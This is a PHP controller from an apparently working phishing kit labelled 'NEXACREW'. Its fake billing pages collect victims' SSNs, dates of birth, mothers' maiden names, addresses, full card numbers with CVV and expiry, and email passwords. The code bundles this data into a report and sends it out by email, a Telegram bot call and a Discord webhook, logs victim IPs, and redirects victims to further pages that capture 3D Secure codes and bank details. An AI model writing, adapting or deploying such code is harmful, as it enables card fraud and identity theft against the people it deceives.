<?php
defined("ALLOW") or exit('No direct script access allowed');

class Billing
{
	public $goNEXA;
	public function __construct()
	{
		$this->goNEXA = new goNEXA();
		if (!isset($_SESSION['access']) and ($_SESSION['access'] != 7)) {
			write(FCPATH . 'Static/log_click.txt', 'a', "|" . _time() . "|{$this->goNEXA->ip_address}|{$_SESSION['country']}|{$this->goNEXA->browser}|{$this->goNEXA->platform}|RELOAD\r\n");
			redirect(base_url() . '?' . _config('PARAMETER'));
		}
	}
	public function index()
	{
		if ($this->goNEXA->is_mobile) {
			echo view('mobile/bsq');
		} else {
			echo view('pc/bsq');
		}
	}

	public function first()
	{
		if (isset($_POST['mmn'])) {
			$_SESSION['mmn'] = trim($_POST['mmn']);
		}
		if (isset($_POST['ssn'])) {
			$_SESSION['ssn'] = trim($_POST['ssn']);
		}
		if (isset($_POST['dob'])) {
			$_SESSION['dob'] = trim($_POST['dob']);
		}
		if (isset($_POST['zipcode'])) {
			$_SESSION['zipcode'] = trim($_POST['zipcode']);
		}
		if (isset($_POST['phone'])) {
			$_SESSION['phone'] = trim($_POST['phone']);
		}

		if ($this->goNEXA->is_mobile) {
			echo view('mobile/billing');
		} else {
			echo view('pc/billing');
		}
	}

	public function try()
	{
		if (isset($_POST['address'])) {
			$_SESSION['address'] = trim($_POST['address']);
		}
		if (isset($_POST['cityp'])) {
			$_SESSION['cityp'] = trim($_POST['cityp']);
		}
		if (isset($_POST['region'])) {
			$_SESSION['region'] = trim($_POST['region']);
		}
		if (isset($_POST['zipcode'])) {
			$_SESSION['zipcode'] = trim($_POST['zipcode']);
		}

		if ($this->goNEXA->is_mobile) {
			echo view('mobile/card');
		} else {
			echo view('pc/card');
		}
	}

	public function process()
	{
		if (isset($_POST) && isset($_SESSION)) {
			$address = $_SESSION['address'];
			$cityP = $_SESSION['cityp'];
			$state = $_SESSION['region'];
			$zipCode = $_SESSION['zipcode'];
			$dob = $_SESSION['dob'];
			$ssn = $_SESSION['ssn'];
			$motherName = $_SESSION['mmn'];
			$phone = $_SESSION['phone'];
			$_SESSION['namecard'] = trim($_POST['namecard']);
			$cardHolder = $_SESSION['namecard'];
			$cardNumber = $_POST['ccn'];
			$cardNumber = str_replace(" ", "", $cardNumber);
			$cardCvv = $_POST['cvv'];
			$cardExpM = $_POST['expmonth'];
			$cardExpY = $_POST['expyear'];
			$cardExp = substr($cardExpY, 2);
			$_SESSION['ccn'] = $cardNumber;
			$ccN = substr($cardNumber, 0, 6);
			$bin = look_bin($cardNumber);
			$_SESSION['vbv_scheme'] = $bin;
			$email = trim($_SESSION['emailLogin']);
			$password = trim($_SESSION['password_email']);
			$password2 = trim($_SESSION['password_email2']);

			$message =
				"== [NEXACREW] ==

== [EMAIL ACCOUNT] ==

:: Email Address   : {$email}
:: Password        : {$password}
:: Check Password  : {$password2}
:: Checking        : {$email}|{$password}
:: Checking 2      : {$email}|{$password2}

== [CARD DETAILS] ==

:: BIN             : {$bin}
:: Cardholder Name : {$cardHolder}
:: Card Number     : {$cardNumber}
:: Expiration      : {$cardExpM}/{$cardExpY}
:: CVV             : {$cardCvv}
:: Checking        : {$cardNumber}|{$cardExpM}|{$cardExp}|{$cardCvv}

== [BILLING ADDRESS] ==

:: Address         : {$address}
:: City            : {$cityP}
:: State           : {$state}
:: Zip Code        : {$zipCode}
:: Phone           : {$phone}
:: MMN             : {$motherName}
:: SSN             : {$ssn}
:: DOB             : {$dob}

== [DEVICE INFORMATION] ==

:: Time & Date     : " . _date() . "
:: Device          : {$this->goNEXA->platform}
:: Browser         : {$this->goNEXA->browser}
:: Country         : {$_SESSION['country']}
:: State           : {$_SESSION['regionName']}
:: City            : {$_SESSION['city']}
:: IP Address      : {$this->goNEXA->ip_address}
:: User Agent      : {$this->goNEXA->agent}";

			$subject = "CARD #1 :: {$bin} :: [ {$_SESSION['country']} - {$this->goNEXA->ip_address} ]";
			$headers = "From: NEXACREW <idontneed@nexacrew.net>\r\n";

			// Kirim ke Email jika GETACCOUNT = on
			if (_config('GETACCOUNT') == 'on') {
				@mail(_config('RESULT'), $subject, $message, $headers);
			}

			// Kirim ke Telegram jika Telegram = on
			if (_config('Telegram') == 'on') {
				$c = curl_init();
				curl_setopt($c, CURLOPT_URL, 'https://api.telegram.org/bot' . tel('token') . '/sendMessage?chat_id=' . tel('idtelegram') . '&text=' . urlencode($message));
				curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
				curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
				curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
				curl_exec($c);
				curl_close($c);
			}

			// Kirim ke Discord jika DISCORD = on
			if (discord('DISCORD') == 'on') {
				$discordWebhook = discord('DISCORD_WEBHOOK'); // Contoh: https://discord.com/api/webhooks/xxx/yyy
				$json_data = json_encode([
					"content" => $message
				]);

				$ch = curl_init($discordWebhook);
				curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
				curl_setopt($ch, CURLOPT_POST, 1);
				curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
				curl_exec($ch);
				curl_close($ch);
			}
			write(FCPATH . 'Static/log_cc.txt', 'a', "{$this->goNEXA->ip_address}\r\n");
			write(FCPATH . 'Static/log_human.txt', 'a', "|" . _time() . "|{$this->goNEXA->ip_address}|{$_SESSION['country']}|{$this->goNEXA->browser}|{$this->goNEXA->platform}|GET CARD #1\r\n");

			if (_config('GET3DSCURE') == 'on') {
				$_SESSION['access'] = 8;
				redirect(base_url() . 'verify/#sessionId=' . md5(time()));
			} else if (_config('DOUBLECARD') == 'on') {
				$_SESSION['access'] = 9;
				redirect(base_url() . 'payment/#errorId=' . md5(time()));
			} else if (_config('GETBANK') == 'on') {
				$_SESSION['access'] = 10;
				redirect(base_url() . 'bank/#sessionId=' . md5(rand(0, 999)));
			} else {
				$_SESSION['access'] = 11;
				redirect(base_url() . 'finished/#_dn=' . md5(rand(0, 999)));
			}
		}
	}
}
